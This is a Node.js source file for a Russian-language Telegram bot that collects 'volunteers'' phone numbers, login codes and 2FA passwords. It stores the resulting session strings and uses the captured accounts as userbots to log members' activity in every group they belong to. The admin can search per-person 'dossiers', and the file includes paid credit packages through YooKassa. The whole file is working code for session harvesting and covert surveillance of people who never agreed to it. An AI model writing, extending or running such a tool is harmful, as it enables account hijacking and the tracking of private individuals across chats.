const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const express = require('express');
const axios = require('axios');

// ====================================================================
// 🛡️ СИСТЕМА ЖЕЛЕЗОБЕТОННОЙ ЗАЩИТЫ ОТ КРАШЕЙ И ПАДЕНИЙ (АНТИ-КАПРИЗ)
// ====================================================================
process.on('uncaughtException', (err) => {
    console.error('🚨 [Критический перехват] Ошибка потока:', err.stack || err.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🚨 [Критический перехват] Необработанный Promise:', reason);
});

const apiId = 2040;
const apiHash = "b18441a1ff607e10a989891a5462e627";

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID ? process.env.ADMIN_ID.toString() : "0"; 
// 🔥 ТОКЕН ЮКАССЫ ИЗ BOTFATHER (если пустой — платежи будут выдавать ошибку)
const PROVIDER_TOKEN = process.env.PROVIDER_TOKEN || ""; 

if (!TELEGRAM_TOKEN) {
    console.error("❌ ОШИБКА: Переменная TELEGRAM_TOKEN отсутствует в Environment!");
    process.exit(1);
}

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const authStates = {};
const activeSpyClients = [];

// ====================================================================
// 📊 ИНИЦИАЛИЗАЦИЯ СУБД SQLITE
// ====================================================================
const dbPath = path.join(__dirname, 'global_telelog.db');
const db = new sqlite3.Database(dbPath);

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS global_logs (
        chat_id TEXT, chat_title TEXT, user_id TEXT, username TEXT, first_name TEXT,
        msg_count INTEGER DEFAULT 0, sticker_count INTEGER DEFAULT 0, last_seen TEXT, last_hour INTEGER DEFAULT 0,
        PRIMARY KEY (chat_id, user_id)
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS spy_chats (
        chat_id TEXT PRIMARY KEY, chat_title TEXT, total_captured INTEGER DEFAULT 0
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS spy_nodes (
        user_id TEXT PRIMARY KEY, phone TEXT, session_string TEXT, added_at TEXT
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS promo_codes (
        code TEXT PRIMARY KEY, max_uses INTEGER, current_uses INTEGER DEFAULT 0, created_at TEXT
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS user_profiles (
        user_id TEXT PRIMARY KEY, balance INTEGER DEFAULT 0, used_promos TEXT DEFAULT ''
    )`);
});

// Универсальный обработчик юзерботов
async function registerSpyHandlers(client, accountName) {
    client.addEventHandler(async (event) => {
        const message = event.message;
        if (!message) return;
        try {
            if (!message.isGroup && !message.isChannel) return;
            const sender = await message.getSender();
            if (!sender || sender.bot) return;
            const chat = await message.getChat();
            const chatTitle = chat.title || "Скрытая группа";
            
            const chatId = message.chatId ? message.chatId.toString() : "";
            const userId = sender.id.toString();
            const username = sender.username ? `@${sender.username}` : "Без ника";
            const firstName = sender.firstName || "Пользователь";
            
            const isSticker = message.media && message.media.className === 'MessageMediaDocument' ? 1 : 0;
            const isMsg = isSticker ? 0 : 1;
            
            const moscowTime = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
            const currentHour = new Date(new Date().toLocaleString('en-US', { timeZone: 'Europe/Moscow' })).getHours();

            db.run(`
                INSERT INTO global_logs (chat_id, chat_title, user_id, username, first_name, msg_count, sticker_count, last_seen, last_hour)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT(chat_id, user_id) DO UPDATE SET
                    chat_title = excluded.chat_title, username = excluded.username, first_name = excluded.first_name,
                    msg_count = msg_count + excluded.msg_count, sticker_count = sticker_count + excluded.sticker_count,
                    last_seen = excluded.last_seen, last_hour = excluded.last_hour
            `, [chatId, chatTitle, userId, username, firstName, isMsg, isSticker, moscowTime, currentHour]);

            db.run(`
                INSERT INTO spy_chats (chat_id, chat_title, total_captured)
                VALUES (?, ?, 1) ON CONFLICT(chat_id) DO UPDATE SET
                    chat_title = excluded.chat_title, total_captured = total_captured + 1
            `, [chatId, chatTitle]);
        } catch (e) {}
    }, new NewMessage({}));
}

async function initAllSpyNodes() {
    if (process.env.TELEGRAM_SESSION) {
        const primarySession = new StringSession(process.env.TELEGRAM_SESSION);
        const primaryClient = new TelegramClient(primarySession, apiId, apiHash, { connectionRetries: 5, useWSS: true });
        try {
            await primaryClient.connect();
            activeSpyClients.push(primaryClient);
            await registerSpyHandlers(primaryClient, "Главный");
        } catch (e) { console.error(e.message); }
    }
    db.all(`SELECT * FROM spy_nodes`, [], async (err, rows) => {
        if (err || !rows) return;
        for (const row of rows) {
            const nodeClient = new TelegramClient(new StringSession(row.session_string), apiId, apiHash, { connectionRetries: 3, useWSS: true });
            try { await nodeClient.connect(); activeSpyClients.push(nodeClient); await registerSpyHandlers(nodeClient, row.phone); } catch (e) { db.run(`DELETE FROM spy_nodes WHERE user_id = ?`, [row.user_id]); }
        }
    });
}

// ====================================================================
// 🧠 ДИНАМИЧЕСКИЕ МЕНЮ
// ====================================================================
function getMenuText(userId) {
    if (userId.toString() === ADMIN_ID) return "⚡️ *АДМИН-ПАНЕЛЬ СЕТИ ШПИОНАЖА* ⚡️\n\nБратан, управляй промокодами, чекай топы и мониторь сеть.";
    return "⚡️ *ИНФОРМАЦИОННО-АНАЛИТИЧЕСКИЙ БОТ | ФАНСТАТ* ⚡️\n\n📊 *Поиск чата:* Введи название или юзернейм чата, чтобы узнать объём логов.";
}

function getMenuButtons(userId) {
    if (userId.toString() === ADMIN_ID) {
        return {
            inline_keyboard: [
                [{ text: '🏆 Топ-10 Флудеров', callback_data: 'global_top' }, { text: '🏰 Мониторинг чатов', callback_data: 'chats_status' }],
                [{ text: '🎟 Создать промокод', callback_data: 'create_promo_mode' }, { text: '🌐 Статус Сети', callback_data: 'network_status' }],
                [{ text: '⚙️ На главную', callback_data: 'to_main' }]
            ]
        };
    }
    return {
        inline_keyboard: [
            [{ text: '🤝 Стать Добровольцем', callback_data: 'join_network' }, { text: '🎟 Ввести промокод', callback_data: 'enter_promo_mode' }],
            [{ text: '👤 Мой профиль', callback_data: 'my_profile' }, { text: '📖 Инструкция', callback_data: 'bot_info' }]
        ]
    };
}

function searchChatInDb(searchText, callback) {
    db.all(`SELECT * FROM spy_chats WHERE LOWER(chat_title) LIKE LOWER(?)`, [`%${searchText}%`], (err, rows) => {
        if (err || !rows || rows.length === 0) return callback(`❌ *Чат не найден.*`);
        let response = `🏰 *РЕЗУЛЬТАТЫ ПОИСКА* 🏰\n\n`;
        rows.forEach((row, index) => { response += `${index + 1}. *${row.chat_title}*\n   └ 📊 Сообщений: *${row.total_captured}*\n\n`; });
        callback(response);
    });
}

function searchUser(param, isUsername, callback) {
    let querySQL = isUsername ? `SELECT * FROM global_logs WHERE LOWER(username) = LOWER(?)` : `SELECT * FROM global_logs WHERE user_id = ?`;
    db.all(querySQL, [param], (err, rows) => {
        if (err || !rows || rows.length === 0) return callback(`❌ *Объект не найден.*`);
        let totalMsg = 0, chatsList = '';
        rows.forEach(row => { totalMsg += row.msg_count; chatsList += `• *${row.chat_title}*: 💬 *${row.msg_count}*\n`; });
        callback(`👤 *ДОСЬЕ ПОЛЬЗОВАТЕЛЯ* 👤\n\n• *Имя:* ${rows[0].first_name}\n• *ID:* \`${rows[0].user_id}\`\n\n🏰 *Замечен в чатах:*\n${chatsList}`);
    });
}

// ====================================================================
// 📥 ОБРАБОТЧИК ТЕКСТОВЫХ СООБЩЕНИЙ
// ====================================================================
bot.on('message', async (msg) => {
    if (msg.chat.type !== 'private') return;
    const chatId = msg.chat.id;
    const text = msg.text ? msg.text.trim() : '';
    const state = authStates[chatId];

    if (text === '/start') {
        delete authStates[chatId];
        db.run(`INSERT OR IGNORE INTO user_profiles (user_id) VALUES (?)`, [chatId.toString()]);
        return bot.sendMessage(chatId, getMenuText(chatId), { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
    }

    // Обработка промокодов (Создание админом)
    if (state && state.step === 'WAITING_PROMO_CREATION' && chatId.toString() === ADMIN_ID) {
        if (!text.includes(':')) return bot.sendMessage(chatId, "⚠️ Формат: `ПРОМО:КОЛИЧЕСТВО`. Пример: `VIP:10`:");
        const [promoCode, rawMaxUses] = text.split(':');
        const maxUses = parseInt(rawMaxUses, 10);
        if (isNaN(maxUses) || maxUses <= 0) return bot.sendMessage(chatId, "❌ Неверное число.");
        
        db.run(`INSERT INTO promo_codes (code, max_uses, current_uses, created_at) VALUES (?, ?, 0, ?)`, [promoCode.toUpperCase(), maxUses, new Date().toLocaleString('ru-RU')], () => {
            delete authStates[chatId];
            return bot.sendMessage(chatId, `🎉 Промокод *${promoCode.toUpperCase()}* создан на ${maxUses} юзеров!`, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
        });
        return;
    }

    // Обработка промокодов (Ввод юзером)
    if (state && state.step === 'WAITING_PROMO_INPUT') {
        const inputCode = text.toUpperCase();
        db.get(`SELECT * FROM promo_codes WHERE code = ?`, [inputCode], (err, promo) => {
            if (err || !promo) return bot.sendMessage(chatId, "❌ Такого промокода нет. Попробуй еще раз:");
            if (promo.current_uses >= promo.max_uses) return bot.sendMessage(chatId, "🔴 Лимит промокода исчерпан.");
            
            db.get(`SELECT * FROM user_profiles WHERE user_id = ?`, [chatId.toString()], (err, profile) => {
                const usedPromos = profile && profile.used_promos ? profile.used_promos.split(',') : [];
                if (usedPromos.includes(inputCode)) { delete authStates[chatId]; return bot.sendMessage(chatId, "⚠️ Ты уже вводил этот код."); }
                
                db.run(`UPDATE promo_codes SET current_uses = current_uses + 1 WHERE code = ?`, [inputCode]);
                usedPromos.push(inputCode);
                const updatedStr = usedPromos.join(',');
                
                db.run(`INSERT INTO user_profiles (user_id, balance, used_promos) VALUES (?, 100, ?) ON CONFLICT(user_id) DO UPDATE SET balance = balance + 100, used_promos = ?`, [chatId.toString(), updatedStr, updatedStr], () => {
                    delete authStates[chatId];
                    return bot.sendMessage(chatId, `🔥 Промокод активирован! +100 Кредитов.`, { reply_markup: getMenuButtons(chatId) });
                });
            });
        });
        return;
    }

    // Авторизация добровольцев
    if (state && state.step === 'WAITING_PHONE') {
        const phone = text.replace(/\s+/g, '');
        bot.sendMessage(chatId, "⏳ Подключаюсь к Telegram...");
        const tempClient = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 3, useWSS: true });
        try {
            await tempClient.connect();
            const phoneCodeHash = await tempClient.sendCode({ apiId, apiHash }, phone);
            authStates[chatId] = { step: 'WAITING_CODE', phone: phone, phoneCodeHash: phoneCodeHash.phoneCodeHash, client: tempClient };
            return bot.sendMessage(chatId, `📬 Код отправлен на ${phone}. Введи его:`);
        } catch (e) { return bot.sendMessage(chatId, `❌ Ошибка: ${e.message}`); }
    }

    if (state && state.step === 'WAITING_CODE') {
        try {
            await state.client.signIn({ phoneNumber: state.phone, phoneCodeHash: state.phoneCodeHash, phoneCode: text });
            const me = await state.client.getMe();
            db.run(`INSERT INTO spy_nodes (user_id, phone, session_string, added_at) VALUES (?, ?, ?, ?)`, [me.id.toString(), state.phone, state.client.session.save(), new Date().toLocaleString('ru-RU')]);
            activeSpyClients.push(state.client);
            await registerSpyHandlers(state.client, me.username);
            delete authStates[chatId];
            return bot.sendMessage(chatId, `🎉 Узел успешно интегрирован!`);
        } catch (err) {
            if (err.message.includes("SESSION_PASSWORD_NEEDED")) { authStates[chatId].step = 'WAITING_PASSWORD'; return bot.sendMessage(chatId, "🔑 Введи пароль 2FA:"); }
            return bot.sendMessage(chatId, `❌ Ошибка кода.`);
        }
    }

    if (state && state.step === 'WAITING_PASSWORD') {
        try {
            await state.client.signIn({ password: text });
            const me = await state.client.getMe();
            db.run(`INSERT INTO spy_nodes (user_id, phone, session_string, added_at) VALUES (?, ?, ?, ?)`, [me.id.toString(), state.phone, state.client.session.save(), new Date().toLocaleString('ru-RU')]);
            activeSpyClients.push(state.client);
            await registerSpyHandlers(state.client, me.username);
            delete authStates[chatId];
            return bot.sendMessage(chatId, `🎉 Узел с 2FA успешно подключен!`);
        } catch (e) { return bot.sendMessage(chatId, `❌ Пароль неверный.`); }
    }

    // Поисковые запросы
    if (chatId.toString() === ADMIN_ID) {
        let param = text; let isUsername = false;
        if (msg.forward_from) param = msg.forward_from.id.toString();
        else if (text.startsWith('@')) isUsername = true;
        else if (!/^\d+$/.test(text)) return bot.sendMessage(chatId, "⚠️ Вбивай @username или ID.");
        searchUser(param, isUsername, (res) => { bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } }); });
    } else {
        searchChatInDb(text, (res) => { bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } }); });
    }
});

// ====================================================================
// 🎛️ СИСТЕМА НАЖАТИЙ И ИНЛАЙН КНОПОК
// ====================================================================
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const data = query.data;

    if (data === 'to_main') {
        delete authStates[chatId];
        bot.editMessageText(getMenuText(chatId), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) }).catch(() => {});
    }

    // 💰 ВЫБОР СТОИМОСТИ ПОПОЛНЕНИЯ (ЮКАССА)
    else if (data === 'buy_credits_menu') {
        const tariffMsg = "💳 *ПОПОЛНЕНИЕ БАЛАНСА ЧЕРЕЗ ЮKASSA* 💳\n\nВыбери желаемый пакет Кредитов для покупки:\n\n" +
                          "• Пакет «Новичок»: *100 Кредитов* = `100 руб.`\n" +
                          "• Пакет «Шпион»: *600 Кредитов* = `500 руб.` (Выгода 100 очков)\n" +
                          "• Пакет «Синдикат»: *1500 Кредитов* = `1000 руб.` (Выгода 500 очков)";
        
        const tariffButtons = {
            inline_keyboard: [
                [{ text: '📦 Пакет Новичок (100 руб)', callback_data: 'pay:100:100' }],
                [{ text: '📦 Пакет Шпион (500 руб)', callback_data: 'pay:500:600' }],
                [{ text: '📦 Пакет Синдикат (1000 руб)', callback_data: 'pay:1000:1500' }],
                [{ text: '⬅️ Назад в профиль', callback_data: 'my_profile' }]
            ]
        };
        bot.editMessageText(tariffMsg, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: tariffButtons }).catch(() => {});
    }

    // 🔥 ГЕНЕРАЦИЯ И ВЫСТАВЛЕНИЕ СЧЕТА (INVOICE)
    else if (data.startsWith('pay:')) {
        if (!PROVIDER_TOKEN) {
            return bot.answerCallbackQuery(query.id, { text: "❌ Ошибка: Администратор не настроил PROVIDER_TOKEN ЮKassa в панели Render!", show_alert: true });
        }
        const [_, price, credits] = data.split(':');
        
        bot.deleteMessage(chatId, messageId).catch(() => {}); // Удаляем меню тарифов

        // Накатываем инвойс платежа
        bot.sendInvoice(
            chatId,
            `Пополнение баланса: +${credits} Кредитов`,
            `Приобретение пакета доступа к аналитическим базам данных ФАНСТАТ на ${credits} единиц.`,
            `credits_pack_${price}_${credits}`, // Уникальный payload
            PROVIDER_TOKEN,
            'RUB', // Валюта в рублях
            [{ label: `Пакет ${credits} Кредитов`, amount: parseInt(price, 10) * 100 }], // Цена в копейках (100 руб = 10000 копеек)
            { start_parameter: 'pay_credits' }
        ).catch((err) => {
            bot.sendMessage(chatId, `❌ Ошибка выставления счета: \`${err.message}\``);
        });
    }

    // Админ-функции
    else if (data === 'create_promo_mode') {
        if (chatId.toString() !== ADMIN_ID) return;
        authStates[chatId] = { step: 'WAITING_PROMO_CREATION' };
        bot.editMessageText("🎟 Пришли строку формата `ПРОМО:ЛИМИТ`:", { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } });
    }
    else if (data === 'global_top') {
        db.all(`SELECT username, first_name, SUM(msg_count) as total FROM global_logs GROUP BY user_id ORDER BY total DESC LIMIT 10`, [], (err, rows) => {
            let t = "🏆 *ТОП-10 ФЛУДЕРОВ* 🏆\n\n"; rows.forEach((r, i) => { t += `${i+1}. *${r.first_name}* — 💬 *${r.total}*\n`; });
            bot.editMessageText(t, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } });
        });
    }
    else if (data === 'chats_status') {
        db.all(`SELECT * FROM spy_chats ORDER BY total_captured DESC`, [], (err, rows) => {
            let t = "🏰 *МОНИТОРИНГ ЧАТОВ* 🏰\n\n"; rows.forEach((r, i) => { t += `${i+1}. *${r.chat_title}* — *${r.total_captured}*\n`; });
            bot.editMessageText(t, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } });
        });
    }
    else if (data === 'network_status') {
        db.get(`SELECT COUNT(*) as count FROM spy_nodes`, [], (err, row) => {
            bot.editMessageText(`🌐 Активных узлов онлайн: *${activeSpyClients.length}*\n• Сдано юзерами: *${row.count}*`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } });
        });
    }

    // Юзер-функции
    else if (data === 'enter_promo_mode') {
        authStates[chatId] = { step: 'WAITING_PROMO_INPUT' };
        bot.editMessageText("🎟 Введи секретный промокод:", { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } });
    }
    else if (data === 'join_network') {
        authStates[chatId] = { step: 'WAITING_PHONE' };
        bot.editMessageText("🤝 Введи телефон в формате `+79991234567`:", { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } });
    }
    else if (data === 'my_profile') {
        db.get(`SELECT * FROM user_profiles WHERE user_id = ?`, [chatId.toString()], (err, row) => {
            const balance = row ? row.balance : 0;
            const profileText = `👤 *ТВОЙ ЛИЧНЫЙ ПРОФИЛЬ* 👤\n\n` +
                                `• Твой Telegram ID: \`${chatId}\`\n` +
                                `• Бонусный баланс: *${balance}* Кредитов\n\n` +
                                `💳 Ты можешь официально пополнить баланс через ЮKassa!`;
            bot.editMessageText(profileText, { 
                chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', 
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💳 Пополнить баланс (ЮKassa)', callback_data: 'buy_credits_menu' }],
                        [{ text: '⬅️ На главную', callback_data: 'to_main' }]
                    ]
                } 
            }).catch(() => {});
        });
    }
    else if (data === 'bot_info') {
        bot.editMessageText("📖 Отправь мне название любого чата, чтобы узнать объём логов в системе.", { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } });
    }
    try { bot.answerCallbackQuery(query.id); } catch(e) {}
});

// ====================================================================
// 💳 ШЛЮЗЫ ОБРАБОТКИ ПЛАТЕЖЕЙ TELEGRAM PAYMENTS (ЮKASSA)
// ====================================================================

// 1. Предварительная проверка платежа (Telegram спрашивает, всё ли ок, перед списанием денег)
bot.on('pre_checkout_query', (query) => {
    // Говорим Телеграму "ОК", транзакцию проводить можно
    bot.answerPreCheckoutQuery(query.id, true).catch((err) => {
        console.error("Ошибка pre_checkout_query:", err.message);
    });
});

// 2. Финальный перехват успешного платежа и начисление баланса в базу
bot.on('successful_payment', (msg) => {
    const chatId = msg.chat.id;
    const paymentInfo = msg.successful_payment;
    const payload = paymentInfo.invoice_payload; // Извлекаем наш сохраненный credits_pack_цена_кредиты

    try {
        if (payload && payload.startsWith('credits_pack_')) {
            const [_, price, creditsStr] = payload.split('_');
            const creditsToCredit = parseInt(creditsStr, 10);

            // Начисляем кредиты в SQLite
            db.run(`INSERT INTO user_profiles (user_id, balance, used_promos) VALUES (?, ?, '')
                    ON CONFLICT(user_id) DO UPDATE SET balance = balance + ?`,
                    [chatId.toString(), creditsToCredit, creditsToCredit], (err) => {
                
                if (err) {
                    return bot.sendMessage(chatId, "⚠️ Возникла системная ошибка при зачислении баллов. Напишите админу, чек сохранён!");
                }

                // Шлём поздравительное сообщение клиенту
                bot.sendMessage(chatId, `🎉 *ОПЛАТА ПРОШЛА УСПЕШНО!* 🎉\n\n` +
                                       `• Сумма платежа: *${paymentInfo.total_amount / 100} ${paymentInfo.currency}*\n` +
                                       `• Зачислено бонусов: *+${creditsToCredit} Кредитов*\n\n` +
                                       `Проверь баланс в меню «👤 Мой профиль». Спасибо за покупку!`, { parse_mode: 'Markdown' });
            });
        }
    } catch (err) {
        console.error("Критический сбой зачисления средств:", err.message);
    }
});

initAllSpyNodes();

// ====================================================================
// 🌐 ВЕБ-СЕРВЕР И АВТО-ПИНГ
// ====================================================================
const app = express();
app.get('/', (req, res) => res.send('Payment Gateway Active'));
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[Executive Server] Системный хаб развернут на порту: ${PORT}`);
    setInterval(() => {
        const url = process.env.RENDER_EXTERNAL_URL;
        if (url) axios.get(url).catch(() => {});
    }, 180000);
});
